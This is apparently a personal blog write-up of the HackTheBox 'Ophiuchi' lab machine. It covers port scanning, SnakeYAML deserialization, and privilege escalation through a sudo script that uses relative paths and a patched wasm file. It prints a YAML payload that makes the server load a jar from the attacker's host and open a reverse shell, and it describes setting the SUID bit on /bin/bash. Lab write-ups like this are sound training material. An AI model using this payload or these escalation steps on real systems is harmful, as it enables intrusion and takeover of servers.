---
layout: post
title: Opiuchi Box Write-up(HTB)
author: arimaqz
categories: [Writeup, HTB]
tags: [snakeyaml-deserilization]
---
This is a writeup of opiuchi box hosted on HackTheBox.

![achivement](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/achievement.webp)

## Information gathering
the first phase is information gathering and we don’t really have that in hackthebox but we do know that the machine is a linux machine and the IP is `10.10.10.227`.

## Enumeration
i started the process with nmap: `nmap -T5 -A -p- 10.10.10.227`

the result was:
![nmap result   ](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/nmap-result.webp)

there are 2 open ports: SSH and HTTP. i know i can’t get a shell with SSH alone so i checked the HTTP server:
![nmap result   ](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/http-page.webp)

a yaml parser! so i checked for potential vulnerabilities and came across [this medium article](https://swapneildash.medium.com/snakeyaml-deserilization-exploited-b4a2c5ac0858) and [this github repository.](https://github.com/artsploit/yaml-payload).

basically we can pass a java constructor into yaml parser and make it send a request to our server for a file, which will have a reverse shell in it!

## Exploitation
i fired up a python server:

![python sserver](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/python-server.webp)

then i tested this vulnerability:

![testing vulnerability](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/testing%20vulnerability.webp)

and i saw that it made a request to us, then i followed the github repository’s steps to make it upload and run my reverse shell on the machine, and so i cloned the repository and edited the java file:

![edited java file](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/edited-java-file.webp)

this will make the machine download the reverse shell file and then execute it, resulting in a shell for us. i then followed the steps to make it a jar file. after that i made the yaml parser send a request to that file and started a netcat listener:

```
!!javax.script.ScriptEngineManager [
 !!java.net.URLClassLoader [[
 !!java.net.URL [“http://10.10.xx.xx:8000/snakeyaml/yaml-payload.jar"]
 ]]
]
```

## Post Exploitation
now that i got a shell, it’s time to escalate my privileges. i searched through the web server files and found this:

![username and password](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/usernamenpass.webp)

the username and password of the admin. i used that to ssh into the server with admin user and it was a success. there was a user flag file in the home directory too. then i tried to escalate my privileges further, to root! i used `sudo -l` to check whether there is anything i can abuse or not, and there was this:

![sudo -l](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/sudol.webp)

i then tried to run it to see what was going on, but it failed miserably so i `cat` ed the file to see what was written in it:

![script flaws](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/scriptflaws.webp)

there was a flaw in it! it used relative paths and not absolute ones, meaning i could abuse it by running the script from say `tmp` folder and create those files by myself. there were those two files in the same folder as the script too, i copied `main.wasm` to `tmp` and created my own `deploy.sh` and put `chmod +s /bin/bash` in it to make `/bin/bash` executable by my current account as root so that i could get root. but there was another problem and the problem was that the script was using an `if statement` to check whether variable `f` is `1` or not, and it had to be `1` to run perfectly but it wasn’t for some reason. so i copied `main.wasm` to my machine and used `wasm2wat` to check its content:

![wasm file](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/wasm.webp)

function info has a constant variable `i32` that is set to `0`, i tried setting that to `1`:

![edited wasm](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/editedwasm.webp)

then i converted it to wasm again and started a python server and used curl on HTB machine and downloaded the file, then i ran the script again and i could get root:

![getting root](/assets/img/posts/2021-07-03-ophiuchi-box-write-up/gettingroot.webp)

then i got the root flag in `/root` and that was my write-up for Opiuchi box at hackthebox!
